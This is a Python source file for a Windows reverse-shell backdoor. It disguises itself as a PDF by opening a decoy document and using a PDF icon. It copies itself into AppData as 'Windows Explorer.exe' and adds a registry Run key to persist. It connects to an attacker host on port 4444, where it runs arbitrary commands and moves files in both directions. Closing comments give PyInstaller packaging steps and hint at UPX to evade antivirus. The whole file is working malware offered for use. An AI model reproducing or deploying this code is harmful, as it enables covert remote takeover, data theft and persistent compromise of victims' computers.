#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent() # Make the backdoor persistent
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object
        self.connection.connect((ip, port)) # Connect to the attacker machine


    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" # Set the location of the file
        if not os.path.exists(evil_file_location): # If the file does not exist\
            shutil.copyfile(sys.executable, evil_file_location) # Copy the file to the location
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True) # Add the file to the run on startup



    def reliable_send(self, data):
        json_data = json.dumps(data)  # Convert the data to JSON format
        self.connection.send(json_data.encode())  # Send the JSON data to the target machine


    def reliable_receive(self):
        json_data = ""  # Initialize the variable
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()  # Receive the JSON data from the target machine
                return json.loads(json_data)  # Convert the JSON data to Python data
            except ValueError:
                continue


    def execute_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode() # Execute the command and return the result
        except subprocess.CalledProcessError:
            return "[-] Error during command execution"
    

    def change_working_directory_to(self, path):
        if os.path.exists(path):
            os.chdir(path)  # Change the working directory
            return "[+] Changing working directory to " + path
        else:
            return "[-] Error: Path does not exist: " + path


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode() # Read the file and return the content


    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content)) # Write the content to the file
            return "[+] Upload successful"


    def run(self):
        while True:
            command = self.reliable_receive() # Receive the command from the attacker machine
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1]) # Change the working directory
                elif command[0] == "download":
                    command_result = self.read_file(command[1]) # Read the file
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2]) # Write the file
                else:
                    command_result = self.execute_command(command)  # Execute the command
            except Exception:
                command_result = "[-] Error during command execution"
                
            self.reliable_send(command_result) # Send the result back to the attacker machine

file_name = sys._MEIPASS + "\sample.pdf" # Location for pdf
subprocess.Popen(file_name, shell=True) # Open the pdf file

try:
    my_backdoor = Backdoor("192.168.29.5", 4444) # Create an object of the class
    my_backdoor.run() # Call the run method
except Exception:
    sys.exit()

# This dosen't bypass the antivirus u can do it by using upx and compressing .exe file
# Package this script into an executable file with PyInstaller and make sure to be packaged in windows computer
# Pyinstaller.exe --add-data “location\\sample.pdf, . ” -—onefile -—nonconsole --icon pdf.ico backdoor.py
